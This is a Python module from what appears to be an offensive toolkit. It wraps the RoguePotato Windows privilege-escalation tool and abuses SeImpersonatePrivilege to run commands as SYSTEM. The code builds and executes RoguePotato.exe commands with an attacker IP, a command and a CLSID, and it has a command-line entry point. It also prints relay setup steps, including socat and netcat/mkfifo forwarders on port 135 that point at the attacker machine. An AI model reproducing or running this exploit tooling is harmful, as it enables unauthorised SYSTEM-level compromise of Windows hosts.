import os
from typing import Tuple, Optional
from pathlib import Path

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import PotatoExploitBase


class RoguePotatoExploit(PotatoExploitBase):
    """Exploit using RoguePotato for privilege escalation."""

    def __init__(self, output_dir: str = "token_impersonation"):
        """
        Initialize the RoguePotato exploit module.

        Args:
            output_dir: Directory for storing output files
        """
        super().__init__("roguepotato", output_dir)
        self.tool_path = "C:\\Windows\\Temp\\RoguePotato.exe"
        self.log("RoguePotato exploit module initialized", "SUCCESS")

    def get_requirements(self) -> dict:
        """
        Get the requirements for this exploit.

        Returns:
            Dictionary with requirement information
        """
        return {
            'privilege': 'SeImpersonatePrivilege',
            'min_windows': 'Windows 10 1809 / Server 2019',
            'external_requirement': 'Attacker-controlled relay server',
            'tool_url': self.TOOL_URLS['roguepotato'],
            'description': 'Remote DCOM relay impersonation'
        }

    def print_relay_setup_instructions(self, attacker_ip: str, local_port: int = 9999) -> None:
        """
        Print instructions for setting up the relay server.

        Args:
            attacker_ip: Attacker machine IP
            local_port: Local port for RoguePotato to listen on
        """
        print("\n" + "=" * 60)
        print("RELAY SERVER SETUP INSTRUCTIONS")
        print("=" * 60)

        print(f"""
On your attacker machine ({attacker_ip}), run ONE of these:

Option 1 - Using socat:
    socat tcp-listen:135,reuseaddr,fork tcp:{attacker_ip}:{local_port}

Option 2 - Using the RoguePotato redirector:
    RogueOxidResolver.exe -ip {attacker_ip}

Option 3 - Using netcat relay (manual):
    mkfifo /tmp/relay
    nc -lvp 135 < /tmp/relay | nc {attacker_ip} {local_port} > /tmp/relay

The relay intercepts port 135 traffic and forwards it to the
RoguePotato listener on the target.
""")

    def exploit(self, command: str = "cmd.exe",
                rhost: str = None,
                rport: int = 9999) -> Tuple[bool, str]:
        """
        Execute RoguePotato privilege escalation.

        Args:
            command: Command to execute as SYSTEM
            rhost: Attacker IP address (required)
            rport: Local port for RoguePotato listener

        Returns:
            Tuple of (success, output)
        """
        self.log(f"Attempting privilege escalation with RoguePotato...")

        # Validate required parameter
        if not rhost:
            self.log("RoguePotato requires attacker IP (rhost)", "ERROR")
            self.print_relay_setup_instructions("<ATTACKER_IP>")
            return False, "Missing required parameter: rhost"

        self.log(f"Attacker IP: {rhost}")
        self.log(f"Local port: {rport}")
        self.log(f"Target command: {command}")

        # Verify tool exists
        if not self.check_tool_exists():
            return False, f"Tool not found: {self.tool_path}"

        # Print relay instructions
        self.print_relay_setup_instructions(rhost, rport)

        # Build command
        cmd = f'{self.tool_path} -r {rhost} -e "{command}" -l {rport}'

        self.log(f"Executing: {cmd}")
        self.log("Make sure relay server is running!", "WARNING")

        try:
            result = self.run_command(cmd, timeout=120)

            output = result.stdout + result.stderr

            self.log("Command output:", "INFO")
            for line in output.split('\n'):
                if line.strip():
                    print(f"    {line}")

            # Check for success
            if self.verify_system_privileges(output) or result.returncode == 0:
                self.log("SUCCESS! Escalated to SYSTEM", "SUCCESS")
                return True, output
            else:
                self.log("Escalation may have failed", "WARNING")
                self.log("Check relay server connection", "INFO")
                return False, output

        except Exception as e:
            self.log(f"RoguePotato failed: {e}", "ERROR")
            return False, str(e)

    def exploit_with_clsid(self, rhost: str, clsid: str,
                           command: str = "cmd.exe",
                           rport: int = 9999) -> Tuple[bool, str]:
        """
        Execute RoguePotato with a custom CLSID.

        Args:
            rhost: Attacker IP address
            clsid: Custom CLSID to use
            command: Command to execute as SYSTEM
            rport: Local port for listener

        Returns:
            Tuple of (success, output)
        """
        self.log(f"Using custom CLSID: {clsid}")

        if not self.check_tool_exists():
            return False, f"Tool not found: {self.tool_path}"

        cmd = f'{self.tool_path} -r {rhost} -e "{command}" -l {rport} -c {clsid}'

        self.log(f"Executing: {cmd}")

        try:
            result = self.run_command(cmd, timeout=120)
            output = result.stdout + result.stderr

            if self.verify_system_privileges(output):
                self.log("SUCCESS! Escalated to SYSTEM", "SUCCESS")
                return True, output
            else:
                return False, output

        except Exception as e:
            return False, str(e)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="RoguePotato Exploit")
    parser.add_argument('--rhost', '-r', required=True,
                        help='Attacker IP address (required)')
    parser.add_argument('--rport', '-p', type=int, default=9999,
                        help='Local listening port')
    parser.add_argument('--command', '-c', default='whoami',
                        help='Command to execute as SYSTEM')
    parser.add_argument('--clsid', help='Custom CLSID')
    parser.add_argument('--tool-path', '-t',
                        help='Path to RoguePotato.exe')
    parser.add_argument('--setup-only', action='store_true',
                        help='Only print relay setup instructions')

    args = parser.parse_args()

    exploit = RoguePotatoExploit()

    if args.tool_path:
        exploit.set_tool_path(args.tool_path)

    if args.setup_only:
        exploit.print_relay_setup_instructions(args.rhost, args.rport)
    elif args.clsid:
        success, output = exploit.exploit_with_clsid(
            args.rhost, args.clsid, args.command, args.rport
        )
    else:
        success, output = exploit.exploit(
            command=args.command, rhost=args.rhost, rport=args.rport
        )
        print(f"\n[{'SUCCESS' if success else 'FAILED'}]")